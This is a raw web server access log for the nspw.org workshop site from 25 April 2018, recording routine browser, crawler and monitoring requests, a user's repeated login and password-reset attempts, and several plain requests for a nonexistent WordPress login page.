37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /modules/system/system.base.css?p7kfx6 HTTP/1.1" 200 2464 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /modules/system/system.messages.css?p7kfx6 HTTP/1.1" 200 903 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /misc/drupal.js?p7kfx6 HTTP/1.1" 200 7529 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /modules/node/node.css?p7kfx6 HTTP/1.1" 200 472 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /modules/user/user.css?p7kfx6 HTTP/1.1" 200 1062 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /themes/garland/print.css?p7kfx6 HTTP/1.1" 200 771 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /themes/garland/style.css?p7kfx6 HTTP/1.1" 200 5370 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2534 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 993 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 812 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 486 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 798 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:12 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 754 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
95.216.19.59 - - [25/Apr/2018:11:43:18 -0400] "GET /papers/2012/forms/index.htm HTTP/1.1" 200 6272 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
37.191.152.34 - - [25/Apr/2018:11:43:20 -0400] "GET /2018/organizers HTTP/1.1" 200 3722 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:24 -0400] "GET /login HTTP/1.1" 200 2873 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:37 -0400] "POST /login?destination=node/3 HTTP/1.1" 200 3128 "https://www.nspw.org/login" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:37 -0400] "GET /misc/message-24-error.png HTTP/1.1" 200 1203 "https://www.nspw.org/modules/system/system.messages.css?p7kfx6" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
95.216.19.59 - - [25/Apr/2018:11:43:40 -0400] "GET /past HTTP/1.1" 200 6332 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
86.120.175.68 - - [25/Apr/2018:11:43:42 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
86.120.175.68 - - [25/Apr/2018:11:43:43 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
37.191.152.34 - - [25/Apr/2018:11:43:51 -0400] "POST /login?destination=node/3 HTTP/1.1" 200 3124 "https://www.nspw.org/login?destination=node/3" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
79.181.115.79 - - [25/Apr/2018:11:43:55 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
79.181.115.79 - - [25/Apr/2018:11:43:55 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:11:44:02 -0400] "GET /proceedings HTTP/1.1" 200 6288 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:44:24 -0400] "GET /registration HTTP/1.1" 200 6654 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
37.191.152.34 - - [25/Apr/2018:11:44:24 -0400] "POST /login?destination=node/3 HTTP/1.1" 200 3124 "https://www.nspw.org/login?destination=node/3" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
180.170.20.238 - - [25/Apr/2018:11:44:28 -0400] "GET /wp-login.php HTTP/1.1" 404 7903 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.170.20.238 - - [25/Apr/2018:11:44:30 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
37.191.152.34 - - [25/Apr/2018:11:44:32 -0400] "GET /user/password HTTP/1.1" 200 2769 "https://www.nspw.org/login?destination=node/3" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:44:33 -0400] "GET /themes/garland/images/bg-tab.png HTTP/1.1" 200 584 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:44:40 -0400] "POST /user/password HTTP/1.1" 200 2854 "https://www.nspw.org/user/password" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
69.162.124.227 - - [25/Apr/2018:11:44:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
95.216.19.59 - - [25/Apr/2018:11:44:46 -0400] "GET /sponsors-2010 HTTP/1.1" 200 6408 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:44:47 -0400] "GET /robots.txt HTTP/1.1" 200 2501 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
37.191.152.34 - - [25/Apr/2018:11:45:07 -0400] "POST /user/password HTTP/1.1" 200 2852 "https://www.nspw.org/user/password" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
95.216.19.59 - - [25/Apr/2018:11:45:09 -0400] "GET / HTTP/1.1" 200 11544 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
220.181.108.119 - - [25/Apr/2018:11:45:20 -0400] "GET /2000/ HTTP/1.1" 200 7192 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.91 - - [25/Apr/2018:11:45:21 -0400] "GET /papers/2012/docs/p105.pdf HTTP/1.1" 200 12456290 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
37.191.152.34 - - [25/Apr/2018:11:45:24 -0400] "GET /user HTTP/1.1" 200 2805 "https://www.nspw.org/user/password" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
95.216.19.59 - - [25/Apr/2018:11:45:31 -0400] "GET /1999/ HTTP/1.1" 200 5129 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
37.191.152.34 - - [25/Apr/2018:11:45:45 -0400] "POST /user HTTP/1.1" 200 2915 "https://www.nspw.org/user" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
95.216.19.59 - - [25/Apr/2018:11:45:53 -0400] "GET /1999/index.html HTTP/1.1" 200 5129 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
37.191.152.34 - - [25/Apr/2018:11:45:55 -0400] "POST /user HTTP/1.1" 200 2915 "https://www.nspw.org/user" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:46:04 -0400] "GET /user/password HTTP/1.1" 200 2765 "https://www.nspw.org/user" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:46:10 -0400] "POST /user/password HTTP/1.1" 200 2866 "https://www.nspw.org/user/password" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
95.216.19.59 - - [25/Apr/2018:11:46:15 -0400] "GET /1999/local.html HTTP/1.1" 200 5762 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:46:37 -0400] "GET /1999/oc.html HTTP/1.1" 200 5284 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
37.191.152.34 - - [25/Apr/2018:11:46:49 -0400] "POST /user/password HTTP/1.1" 200 2867 "https://www.nspw.org/user/password" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
180.23.174.51 - - [25/Apr/2018:11:46:50 -0400] "GET /2018 HTTP/1.1" 200 12606 "-" "LWP::Simple/6.29 libwww-perl/6.29"
95.216.19.59 - - [25/Apr/2018:11:46:58 -0400] "GET /1999/pc.html HTTP/1.1" 200 5279 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
207.46.13.140 - - [25/Apr/2018:11:46:52 -0400] "GET /papers/1993/nspw1993-schaefer.pdf HTTP/1.1" 200 660325 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
95.216.19.59 - - [25/Apr/2018:11:47:20 -0400] "GET /1999/photos.html HTTP/1.1" 200 4939 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
24.203.19.115 - - [25/Apr/2018:11:47:38 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
24.203.19.115 - - [25/Apr/2018:11:47:39 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:11:47:42 -0400] "GET /1999/program.html HTTP/1.1" 200 6264 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:48:04 -0400] "GET /2000/ HTTP/1.1" 200 5339 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:48:26 -0400] "GET /2000/cfp.html HTTP/1.1" 200 6117 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:48:47 -0400] "GET /2000/dates.html HTTP/1.1" 200 4966 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
176.63.29.225 - - [25/Apr/2018:11:48:53 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
176.63.29.225 - - [25/Apr/2018:11:48:54 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.94.139.235 - - [25/Apr/2018:11:49:04 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.94.139.235 - - [25/Apr/2018:11:49:04 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:11:49:09 -0400] "GET /2000/index.html HTTP/1.1" 200 5339 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
169.237.6.144 - - [25/Apr/2018:11:49:18 -0400] "GET / HTTP/1.1" 200 6622 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:20 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:20 -0400] "GET /modules/system/system.theme.css?p7kfx6 HTTP/1.1" 200 1585 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:20 -0400] "GET /modules/comment/comment.css?p7kfx6 HTTP/1.1" 200 505 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:20 -0400] "GET /modules/system/system.messages.css?p7kfx6 HTTP/1.1" 200 903 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:20 -0400] "GET /modules/system/system.menus.css?p7kfx6 HTTP/1.1" 200 1182 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:20 -0400] "GET /modules/system/system.base.css?p7kfx6 HTTP/1.1" 200 2464 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:20 -0400] "GET /misc/drupal.js?p7kfx6 HTTP/1.1" 200 7529 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:20 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1602 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:20 -0400] "GET /modules/field/theme/field.css?p7kfx6 HTTP/1.1" 200 599 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:20 -0400] "GET /modules/node/node.css?p7kfx6 HTTP/1.1" 200 472 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:20 -0400] "GET /modules/user/user.css?p7kfx6 HTTP/1.1" 200 1062 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:20 -0400] "GET /themes/garland/style.css?p7kfx6 HTTP/1.1" 200 5370 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:20 -0400] "GET /themes/garland/print.css?p7kfx6 HTTP/1.1" 200 771 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:20 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2534 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:21 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:21 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:21 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 812 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:21 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 486 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:21 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 993 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:21 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 754 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:21 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 798 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:21 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
169.237.6.144 - - [25/Apr/2018:11:49:21 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
95.216.19.59 - - [25/Apr/2018:11:49:32 -0400] "GET /2000/local.html HTTP/1.1" 200 5610 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
69.162.124.227 - - [25/Apr/2018:11:49:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
95.216.19.59 - - [25/Apr/2018:11:49:54 -0400] "GET /2000/oc.html HTTP/1.1" 200 5254 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
180.76.15.18 - - [25/Apr/2018:11:49:55 -0400] "GET /2009/proceedings/2012/docs/?C=M;O=D HTTP/1.1" 403 3927 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
95.216.19.59 - - [25/Apr/2018:11:50:16 -0400] "GET /2000/past.html HTTP/1.1" 200 5212 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.91 - - [25/Apr/2018:11:50:17 -0400] "GET /registration/payment HTTP/1.1" 200 6623 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
95.216.19.59 - - [25/Apr/2018:11:50:39 -0400] "GET /2000/pc.html HTTP/1.1" 200 5165 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:51:01 -0400] "GET /2001/ HTTP/1.1" 200 5115 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:51:23 -0400] "GET /2001/cfp.html HTTP/1.1" 200 6280 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:51:46 -0400] "GET /2001/dates.html HTTP/1.1" 200 5022 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
185.229.144.22 - - [25/Apr/2018:11:52:05 -0400] "GET /papers/2011/nspw2011%E2%80%90feigenbaum.pdf HTTP/1.1" 404 8260 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) LinkCheck by Siteimprove.com"
95.216.19.59 - - [25/Apr/2018:11:52:08 -0400] "GET /2001/index.html HTTP/1.1" 200 5115 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:52:30 -0400] "GET /2001/local.html HTTP/1.1" 200 5070 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
160.177.238.65 - - [25/Apr/2018:11:52:32 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
160.177.238.65 - - [25/Apr/2018:11:52:33 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:11:52:52 -0400] "GET /2001/past.html HTTP/1.1" 200 5248 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:53:14 -0400] "GET /2001/pc.html HTTP/1.1" 200 5238 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
180.191.0.111 - - [25/Apr/2018:11:53:24 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.191.0.111 - - [25/Apr/2018:11:53:26 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:11:53:36 -0400] "GET /2001/program.html HTTP/1.1" 200 6225 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
111.200.39.117 - - [25/Apr/2018:11:53:39 -0400] "GET /robots.txt HTTP/1.0" 200 4818 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
95.216.19.59 - - [25/Apr/2018:11:53:58 -0400] "GET /2002/index.content HTTP/1.1" 200 4532 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:54:21 -0400] "GET /2002/local.content HTTP/1.1" 200 3725 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
69.162.124.227 - - [25/Apr/2018:11:54:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
95.216.19.59 - - [25/Apr/2018:11:54:42 -0400] "GET /2002/nspw-footer.html HTTP/1.1" 200 4167 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:55:04 -0400] "GET /2002/nspw-header.html HTTP/1.1" 200 3943 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.91 - - [25/Apr/2018:11:55:13 -0400] "GET /2005/nspw-header.shtml HTTP/1.1" 200 3991 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
95.216.19.59 - - [25/Apr/2018:11:55:26 -0400] "GET /2002/oldindex.html HTTP/1.1" 200 5115 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:55:48 -0400] "GET /2002/panel.html HTTP/1.1" 200 4082 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:56:10 -0400] "GET /2002/past.content HTTP/1.1" 200 5041 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:56:31 -0400] "GET /2003/index.content HTTP/1.1" 200 4924 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:56:53 -0400] "GET /2003/local.content HTTP/1.1" 200 4055 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
